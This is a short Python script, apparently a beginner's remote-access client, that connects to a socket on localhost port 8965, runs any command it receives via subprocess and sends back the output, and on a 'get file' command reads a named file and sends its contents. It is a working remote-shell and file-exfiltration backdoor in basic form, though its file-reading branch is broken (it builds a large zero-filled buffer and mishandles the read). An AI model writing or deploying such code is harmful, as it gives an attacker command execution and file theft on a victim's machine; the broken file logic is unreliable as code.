
import os
import socket
import subprocess


def file_size(path):
    return os.path.getsize(path)


def client():
    s = socket.socket()
    s.connect(('127.0.0.1', 8965))

    # message = input('-> ')
    while True:
        data = s.recv(1024).decode('utf-8')
        if 'cmd' in data:
            try:
                data = data.replace('cmd ', '')
                s.send(subprocess.check_output(data))
            except Exception:
                s.send(f"Error with {data} command".encode('utf-8'))

        elif 'get file' in data:
            data = data.replace('get file ', '')
            content = bytes(file_size(data) * 1030)
            with open(data, 'rb') as file:
                for line in file.readline():
                    content += line
            s.send(content)


        else:
            s.send('The command was not found'.encode('utf-8'))

    s.close()


if __name__ == '__main__':
    client()
